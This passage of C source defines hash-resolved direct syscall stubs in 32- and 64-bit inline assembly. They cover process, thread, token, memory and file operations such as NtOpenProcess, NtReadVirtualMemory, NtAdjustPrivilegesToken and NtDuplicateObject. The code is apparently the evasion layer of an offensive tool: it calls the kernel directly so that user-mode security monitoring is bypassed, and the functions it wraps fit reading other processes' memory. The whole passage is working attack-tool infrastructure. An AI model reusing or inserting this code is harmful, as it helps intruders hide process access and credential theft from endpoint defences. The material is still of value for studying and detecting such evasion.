    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN EVENT_TYPE EventType,
    IN BOOLEAN InitialState)
{
    __asm {
        push 0x10893520
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtTerminateThread(
    IN HANDLE ThreadHandle,
    IN NTSTATUS ExitStatus)
{
    __asm {
        push 0x381B3AB5
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS _NtFsControlFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG FsControlCode,
    IN PVOID InputBuffer OPTIONAL,
    IN ULONG InputBufferLength,
    OUT PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputBufferLength)
{
    __asm {
        push 0x20C6D09C
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtGetContextThread(
    IN HANDLE ThreadHandle,
    IN OUT PCONTEXT ThreadContext)
{
    __asm {
        push 0xBA9EF43C
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtSetContextThread(
    IN HANDLE ThreadHandle,
    IN PCONTEXT Context)
{
    __asm {
        push 0xCB668D44
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtResumeThread(
    IN HANDLE ThreadHandle,
    IN OUT PULONG PreviousSuspendCount OPTIONAL)
{
    __asm {
        push 0x1339598F
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtDelayExecution(
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval)
{
    __asm {
        push 0xB6EB75BA
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtGetNextThread(
    IN HANDLE ProcessHandle,
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewThreadHandle)
{
    __asm {
        push 0x1BB0D9EF
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS _NtQueryInformationThread(
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    OUT PVOID ThreadInformation,
    IN ULONG ThreadInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
    __asm {
        push 0x0ACD84E7
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtOpenThread(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL)
{
    __asm {
        push 0x36960437
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtMapViewOfSection(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID BaseAddress,
    IN ULONG ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect)
{
    __asm {
        push 0x7A2D5C79
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtUnmapViewOfSection(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress)
{
    __asm {
        push 0xCA1ACC8F
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

__declspec(naked) NTSTATUS NtImpersonateThread(
    IN HANDLE ThreadHandle,
    IN HANDLE ThreadToImpersonate,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService)
{
    __asm {
        push 0x0C26D619
        call SW3_GetSyscallAddress
        pop ebx
        push eax
        push ebx
        call SW2_GetSyscallNumber
        add esp, 4
        pop ebx
        mov edx, esp
        sub edx, 4
        call ebx
        ret
    }
}

#elif defined(__GNUC__)

__declspec(naked) BOOL local_is_wow64(void)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov rax, 0 \n"
        "ret \n"
    );
#else
    asm(
        SET_SYNTAX
        "mov eax, fs:[0xc0] \n"
        "test eax, eax \n"
        "jne wow64 \n"
        "mov eax, 0 \n"
        "ret \n"
        "wow64: \n"
        "mov eax, 1 \n"
        "ret \n"
    );
#endif
}

__declspec(naked) PVOID getIP(void)
{
#ifdef _WIN64
    asm(
    SET_SYNTAX
    "mov rax, [rsp] \n"
    "ret \n"
    );
#else
    __asm__(
    SET_SYNTAX
    "mov eax, [esp] \n"
    "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PVOID ClientId OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xCD9B2A0F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xCD9B2A0F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtGetNextProcess(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewProcessHandle)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xFFBF1A2F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xFFBF1A2F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtReadVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesRead OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x118B7567 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x118B7567 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtClose(
    IN HANDLE Handle)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x2252D33F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x2252D33F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtOpenProcessToken(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    OUT PHANDLE TokenHandle)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x8FA915A2 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x8FA915A2 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xBDBCBC20 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xBDBCBC20 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtQueryVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT PSIZE_T ReturnLength OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x0393E980 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x0393E980 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtAdjustPrivilegesToken(
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN PTOKEN_PRIVILEGES NewState OPTIONAL,
    IN ULONG BufferLength,
    OUT PTOKEN_PRIVILEGES PreviousState OPTIONAL,
    OUT PULONG ReturnLength OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x17AB1B32 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x17AB1B32 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x0595031B \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x0595031B \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtFreeVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x01932F05 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x01932F05 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateFile(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x96018EB6 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x96018EB6 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtWriteFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN PLARGE_INTEGER ByteOffset OPTIONAL,
    IN PULONG Key OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x24B22A1A \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x24B22A1A \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateProcessEx(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL,
    IN ULONG JobMemberLevel)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x1198E2E3 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x1198E2E3 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x4A5B2C8F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x4A5B2C8F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtDuplicateObject(
    IN HANDLE SourceProcessHandle,
    IN HANDLE SourceHandle,
    IN HANDLE TargetProcessHandle OPTIONAL,
    OUT PHANDLE TargetHandle OPTIONAL,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Options)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x9CBFA413 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x9CBFA413 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtQueryObject_(
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    OUT PVOID ObjectInformation OPTIONAL,
    IN ULONG ObjectInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x0E23F64F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x0E23F64F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtWaitForSingleObject(
    IN HANDLE ObjectHandle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER TimeOut OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x426376E3 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x426376E3 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
